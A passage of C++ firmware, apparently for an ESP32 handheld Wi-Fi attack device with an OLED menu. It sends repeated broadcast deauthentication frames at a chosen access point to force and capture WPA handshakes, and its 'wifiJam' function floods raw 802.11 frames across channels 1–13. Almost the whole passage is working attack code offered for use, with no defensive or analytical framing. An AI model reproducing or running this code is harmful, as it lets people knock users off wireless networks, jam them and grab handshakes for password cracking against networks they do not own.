      display.setTextColor(SSD1306_WHITE);
    }
    display.display();
    if(checkButton(BTN_UP) && target>0) target--;
    else if(checkButton(BTN_DOWN) && target<min(4,networkCount)-1) target++;
    else if(checkButton(BTN_OK)) break;
    else if(checkButton(BTN_BACK)) return;
    delay(50);
  }
  currentTarget=networkNames[target];
  esp_wifi_set_channel(networkChannel[target], WIFI_SECOND_CHAN_NONE);
  handshakeCapturing=true;
  eapolCount=0;
  showMessage("CAPTURING...",1500);
  unsigned long start=millis();
  while(handshakeCapturing && millis()-start<30000){
    sendDeauth(networkBSSID[target], (uint8_t[]){0xFF,0xFF,0xFF,0xFF,0xFF,0xFF}, networkChannel[target]);
    delay(100);
  }
  handshakeCapturing=false;
  if(eapolCount>0) showMessage("HANDSHAKE SAVED!",1500);
  else showMessage("FAILED",1500);
}

void wifiJam() {
  showMessage("JAMMER STARTED",1000);
  for(int i=0;i<500;i++){
    for(int ch=1;ch<=13;ch++){
      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      uint8_t p[128];
      for(int j=0;j<10;j++) esp_wifi_80211_tx(WIFI_IF_STA, p, sizeof(p), false);
    }
    if(checkButton(BTN_BACK)) break;
    delay(10);
  }
}

